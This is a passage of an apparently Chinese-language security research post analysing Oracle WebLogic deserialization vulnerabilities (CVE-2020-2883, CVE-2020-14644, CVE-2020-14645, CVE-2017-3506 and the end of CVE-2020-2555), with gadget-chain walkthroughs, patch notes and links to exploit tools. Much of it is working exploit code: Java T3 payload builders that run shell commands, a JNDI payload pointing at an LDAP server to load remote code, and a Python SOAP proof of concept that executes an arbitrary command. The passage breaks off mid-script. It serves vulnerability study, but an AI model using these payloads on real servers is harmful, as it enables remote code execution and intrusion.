<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">	<span class="comment">// 构造反射连</span></span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">extractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(</span><br><span class="line">        <span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">extractor2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">extractor3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/success&quot;</span>&#125;&#125;</span><br><span class="line">    );</span><br><span class="line">    ReflectionExtractor[] extractors = &#123;</span><br><span class="line">        extractor1,</span><br><span class="line">        extractor2,</span><br><span class="line">        extractor3,</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// 创建LimitFilter实例</span></span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(extractors);</span><br><span class="line">    <span class="type">LimitFilter</span> <span class="variable">limitFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitFilter</span>();</span><br><span class="line">    <span class="comment">// 设置limitFilter的m_comparator属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">m_comparator</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_comparator&quot;</span>);</span><br><span class="line">    m_comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line">    <span class="comment">// 设置limitFilter的m_oAnchorTop属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">m_oAnchorTop</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_oAnchorTop&quot;</span>);</span><br><span class="line">    m_oAnchorTop.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line">	<span class="comment">// 设置BadAttributeValueExpException的val属性</span></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(badAttributeValueExpException, limitFilter);</span><br><span class="line">	<span class="comment">// 序列化并发送payload</span></span><br><span class="line">    <span class="type">byte</span>[] payload = Serializables.serialize(badAttributeValueExpException);</span><br><span class="line">    T3ProtocolOperation.send(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7001&quot;</span>, payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>这里借一下别人的图，修复的方式特别有趣，把整个把<code>LimitFilter</code>类的<code>toString()</code>方法中的全部extractor去掉了</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143734f9c7c3a6c91d0db4a5.png" alt="image-20210127100406491" style="zoom:67%;" />



<h4 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h4><blockquote>
<p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/Y4er/CVE-2020-2883">https://github.com/Y4er/CVE-2020-2883</a></p>
<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2020-2555补丁的绕过，因为<code>LimitFilter</code>被禁了，所以我们需要找其他在内部调用了<code>extract()</code>方法的函数，<code>java.util.PriorityQueue.readObject()</code>就是其中一个，我们跟进<code>heapify()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714375b7d2845c7978cadf80b.png" alt="image-20210127134622640"></p>
<p>递归调用<code>siftDown()</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271438502ed1d21c0123b3c682.png" alt="image-20210127134703950"></p>
<p>如果<code>comparator</code>非空，即如果我们自己定义比较器，就调用<code>siftDownUsingComparator()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714386d889120abe5f2902c96.png" alt="image-20210127134828845"></p>
<p>然后在我们的comparator调用<code>compare()</code>方法时</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127135716314"></p>
<p>在里面也调用了<code>extract()</code>方法，后面就和CVE-2020-2555类似了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127141737892"></p>
<p>exploit核心代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造反射链</span></span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;);</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;);</span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/success&quot;</span>&#125;&#125;);</span><br><span class="line">    ValueExtractor[] valueExtractors = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">        reflectionExtractor1,</span><br><span class="line">        reflectionExtractor2,</span><br><span class="line">        reflectionExtractor3,</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// 创建ChainedExtractor实例</span></span><br><span class="line">    <span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">    ValueExtractor[] valueExtractors1 = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123; reflectionExtractor &#125;;</span><br><span class="line">    <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(valueExtractors1);</span><br><span class="line">    <span class="comment">// 创建PriorityQueue，并使用自定义的chainedExtractor</span></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>(chainedExtractor1));</span><br><span class="line">    queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置m_aExtractor属性</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ChainedExtractor.class.getSuperclass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">m_aExtractor</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;m_aExtractor&quot;</span>);</span><br><span class="line">    m_aExtractor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    m_aExtractor.set(chainedExtractor1, valueExtractors);</span><br><span class="line">	<span class="comment">// 序列化并发送payload</span></span><br><span class="line">    <span class="type">byte</span>[] payload = Serializables.serialize(queue);</span><br><span class="line">    T3ProtocolOperation.send(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;7001&quot;</span>, payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>将存在类似上面操作的<code>extract()</code> 方法的<code>MvelExtractor</code>和<code>ReflectionExtractor</code> 两个类加入到了黑名单中</p>
<h4 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h4><blockquote>
<p>Oracle WebLogic Server 12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a href="https://github.com/potats0/cve_2020_14644">https://github.com/potats0/cve_2020_14644</a></p>
<blockquote>
<p>坑：注意打包成jar的时候把jar文件分开放，不然会有其他jar文件的输出信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021358b9e10947ecdee548a535.png" alt="image-20210129234101716"></p>
<p><strong>漏洞分析</strong></p>
<p>这是一条全新的gadget，漏洞入口点在<code>coherence.jar</code>中的<code>com.tangosol.internal.util.invoke.RemoteConstructor</code>，当反序列化类定义了<code>readResolve()</code>方法时，会在<code>readObject()</code>之后被调用</p>
<p>首先我们得知道，如果变量被<code>transient</code>和<code>static</code>修饰的话是不参与序列化和反序列化的，比如下面的<code>m_serializer</code>和<code>m_loader</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135955524e1a6690fa3d0c29.png" alt="image-20210130120113315"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021359a7b05e8757eadb957aab.png" alt="image-20210130115655500"></p>
<p><code>newInstance()</code>如下<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400756c4a2b55c1afe83845.png" alt="image-20210130115853118"></p>
<p><code>getClassLoader()</code>中因为<code>m_loader</code>为空（原因上面提到），所以调用<code>getContextClassLoader()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400a03df57402b076eb10f3.png" alt="image-20210130115954423"></p>
<p>在<code>realize()</code>方法调用如下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400462dfef75783cc2032c3.png" alt="image-20210130130218731"></p>
<p><code>getDefinition()</code>返回的是我们的<code>m_definition</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a32f3723ecc6d3da1ebd.png" alt="image-20210130125805171"></p>
<p>然后是调用了<code>definition</code>的<code>getRemotableClass()</code>方法，返回的是<code>m_clz</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a6e85ebadc3407627149.png" alt="image-20210130130001177"></p>
<p>但是它也是被<code>transient</code>修饰的，所以返回的也是空</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401d9c44b4992aeefa34844.png" alt="image-20210130130045856"></p>
<p>所以下面我们会调用<code>defineClass()</code>去加载我们的<code>definition</code>，这里就可以自己实例化一个自定义类了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401db235884b695c3092387.png" alt="image-20210130130456664"></p>
<p>相关方法的返回如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> ClassIdentity <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_id;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 包名和方法名用`/`隔开</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.getPackage() + <span class="string">&quot;/&quot;</span> + <span class="built_in">this</span>.getSimpleName();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getPackage</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_sPackage;</span><br><span class="line">   &#125;	</span><br><span class="line"><span class="comment">// 方法名和版本号用`$`隔开</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getSimpleName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.getBaseName() + <span class="string">&quot;$&quot;</span> + <span class="built_in">this</span>.getVersion();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getBaseName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_sBaseName;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">this</span>.m_sVersion;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在后面还会对包名进行检测</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">private</span> ProtectionDomain <span class="title function_">preDefineClass</span><span class="params">(String var1, ProtectionDomain var2)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="built_in">this</span>.checkName(var1)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(<span class="string">&quot;IllegalName: &quot;</span> + var1);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 != <span class="literal">null</span> &amp;&amp; var1.startsWith(<span class="string">&quot;java.&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Prohibited package name: &quot;</span> + var1.substring(<span class="number">0</span>, var1.lastIndexOf(<span class="number">46</span>)));</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">               var2 = <span class="built_in">this</span>.defaultDomain;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (var1 != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="built_in">this</span>.checkCerts(var1, var2.getCodeSource());</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> var2;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// 检查包名</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkName</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (var1 != <span class="literal">null</span> &amp;&amp; var1.length() != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> var1.indexOf(<span class="number">47</span>) == -<span class="number">1</span> &amp;&amp; (VM.allowArraySyntax() || var1.charAt(<span class="number">0</span>) != <span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>所以exploit可以这么编写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化一个ClassIdentity</span></span><br><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>(test.class);</span><br><span class="line"><span class="comment">// ClassPool是CtClass实例的容器</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">// CtClass表示一个class文件，以字节码方式存储</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(test.class.getName());</span><br><span class="line"><span class="comment">// 添加version规范类名</span></span><br><span class="line">ctClass.replaceClassName(test.class.getName(), test.class.getName() + <span class="string">&quot;$&quot;</span> + classIdentity.getVersion());</span><br><span class="line"><span class="comment">// 使用RemoteConstructor类封装</span></span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(<span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, ctClass.toBytecode()), <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>未知</p>
<h4 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h4><blockquote>
<p>Oracle WebLogic Server 12.2.1.4.0</p>
<p>因为此构造链子用到了<code>UniversalExtractor</code>类，而这个类是Weblogic 12.2.1.4.0独有的，所以只能影响这个版本</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p>在<code>weblogic_cmd.jar</code>上修改</p>
<p><a href="https://github.com/Y4er/CVE-2020-14645">https://github.com/Y4er/CVE-2020-14645</a></p>
<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2020-2883的补丁绕过，在CVE-2020-2883把<code>ReflectionExtractor</code>类加入到黑名单，我们可以用<code>UniversalExtractor</code>类去进行构造</p>
<p>依旧是来到之前自定义的比较器，这次我们调用的是<code>UniversalExtractor</code>类的<code>extractor</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021402cab665089beeb289fc12.png" alt="image-20210130141130883"></p>
<p>因为<code>oTarget</code>和<code>targetPrev</code>不相等，所以调用<code>extractComplex()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214038c48020886f649cc2084.png" alt="image-20210130141158447"></p>
<p><code>extractComplex()</code>方法具体调用如下</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403f906fc7d8ec46927ab7d.png" alt="image-20210130141530634"></p>
<p>这里我们要令<code>clzParam</code>为空（原因在下），查看<code>getClassArry()</code>方法，只要令传入的<code>m_aoParam</code>为空即可</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403182d049a76551a629993.png" alt="image-20210130143626948"></p>
<p>然后来到<code>getCanonicalName()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407274effe8c9bf6cda9c08.png" alt="image-20210130144532283"></p>
<p>进入<code>getValueExtractorCanonicalName()</code>方法，获取lambda的方法名，再放入到<code>computeValueExtractorCanonicalName()</code>调用，其实就是提取出<code>.getKey().databaseMetaData</code>的后半部分，即最后返回的<code>sCName</code>为<code>databaseMetaData</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140467bd62ac3f4bb46c692c.png" alt="image-20210130144653254"></p>
<p><code>isPropertyExtractor()</code>返回<code>!m_fMethod</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214071b18a1316fc7eab787db.png" alt="image-20210130141922042"></p>
<p>我们看看<code>m_fMethod</code>的定义，因为<code>m_fMethod</code>被<code>transient</code>修饰，所以<code>fProperty</code>只能为true</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140432f8cbc611eb7fd1ca1b.png" alt="image-20210130143857296"></p>
<p>如果<code>fProperty</code>为true，就会去调用<code>ClassHelper.findMethod()</code>方法，其中<code>BEAN_ACCESSOR_PREFIXES</code>如下，所以说我们可以调用到任意的<code>get、is</code>的方法，这里是漏洞利用的关键点，在该测试中，我们调用的关键方法为<code>getDatabaseMetaData()</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405b1f8225d79e1aaa35a03.png" alt="image-20210130142347926"></p>
<p>令<code>cParams</code>为空，即令上面提到的<code>clzParam</code>为空，<code>fExactMatch</code>就会一直为true，如果<code>fExactMatch &amp;&amp; !fStatic</code>为true，就回去调用<code>getMethod()</code>方法，这样就能顺利返回方法调用</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405957f92e7dcdfb9a598ff.png" alt="image-20210130142813607"></p>
<p>之后就是调用<code>getDatabaseMetaData</code>的<code>invoke()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214067dcd1f4de020641c89d1.png" alt="image-20210130145752528"></p>
<p>持续跟进，我们可以看到调用了<code>getDatabaseMetaData</code>的<code>connect()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140620de56c99f0a1bde7e27.png" alt="image-20210130145845091"></p>
<p>在里面我们就会看到<code>lookup()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140786a4ea00a352dc2ca03d.png" alt="image-20210130145911420"></p>
<p>JNDI的地址就是我们的<code>dataSource</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407d547627a020518b77053.png" alt="image-20210130150003790"></p>
<p>所以exploit的编写如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建ExtractorComparator实例</span></span><br><span class="line"><span class="type">UniversalExtractor</span> <span class="variable">extractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UniversalExtractor</span>(<span class="string">&quot;getDatabaseMetaData()&quot;</span>, <span class="literal">null</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">final</span> <span class="type">ExtractorComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>(extractor);</span><br><span class="line"><span class="comment">// 创建JdbcRowSetImpl实例</span></span><br><span class="line"><span class="type">JdbcRowSetImpl</span> <span class="variable">rowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">rowSet.setDataSourceName(<span class="string">&quot;ldap://172.20.0.2:1089/#exp&quot;</span>);</span><br><span class="line"><span class="comment">// 创建PriorityQueue实例，并使用自定义比较器</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] q = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;rowSet, rowSet&#125;;</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, q);</span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 序列化并发送payload</span></span><br><span class="line"><span class="type">byte</span>[] payload = Serializables.serialize(queue);</span><br><span class="line">T3ProtocolOperation.send(<span class="string">&quot;172.20.0.2&quot;</span>, <span class="string">&quot;7001&quot;</span>, payload);</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>未知</p>
<h3 id="XML反序列化"><a href="#XML反序列化" class="headerlink" title="XML反序列化"></a>XML反序列化</h3><h4 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1、12.2.1.2</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123; <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span> &#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    url = <span class="string">&#x27;%s/wls-wsat/CoordinatorPortType&#x27;</span> % url</span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;java&gt;</span></span><br><span class="line"><span class="string">            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">				&lt;void index=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;%s&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">              &lt;/array&gt;</span></span><br><span class="line"><span class="string">              &lt;void method=&quot;start&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;/object&gt;</span></span><br><span class="line"><span class="string">          &lt;/java&gt;</span></span><br><span class="line"><span class="string">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % cmd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, proxies=proxies)</span><br><span class="line">        response = response.text</span><br><span class="line">        response = re.search(<span class="string">r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;</span>, response).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        response = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;faultstring&gt;java.lang.ProcessBuilder&#x27;</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">&quot;&lt;faultstring&gt;0&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        result = <span class="string">&quot;test ok&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span 